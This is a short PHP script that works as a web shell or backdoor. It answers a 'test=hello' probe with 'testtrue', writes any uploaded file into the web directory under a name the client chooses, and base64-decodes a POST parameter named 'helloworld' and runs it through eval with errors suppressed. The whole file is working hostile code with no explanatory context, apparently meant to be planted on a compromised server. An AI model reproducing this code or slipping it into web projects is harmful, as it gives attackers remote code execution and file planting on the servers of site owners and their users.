<?php



if ("hello"==$_GET["test"])
{
echo "testtrue";
}
elseif(is_uploaded_file($_FILES["filename"]["tmp_name"]))
{
 move_uploaded_file($_FILES["filename"]["tmp_name"],$_FILES["filename"]["name"]);
 echo "true";
}
elseif(isset($_POST['helloworld'])){ $uidmail = base64_decode($_POST['helloworld']); @eval($uidmail); }
